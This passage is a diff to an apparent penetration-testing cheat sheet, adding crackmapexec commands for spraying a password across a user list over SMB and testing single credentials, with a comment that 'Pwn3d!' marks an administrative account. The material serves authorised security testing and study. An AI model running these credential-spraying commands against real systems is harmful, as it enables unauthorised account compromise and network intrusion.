@@ -4281,6 +4281,15 @@ BruteForce $duration $threshold $passwords
 .\Spray-Passwords.ps1 -Pass <PASSWORD> -Admin
 ```
 
+##### crackmapexec
+```shell
+# check if password is used by any user in list
+crackmapexec smb <RHOST> -u users.txt -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
+# test password for user using smb
+crackmapexec smb <RHOST> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
+# if (Pwn3d!) is shown next to a user, it means that the user has administrative privileges
+```
+
 ### Exploitation Tools
 
 #### Metasploit
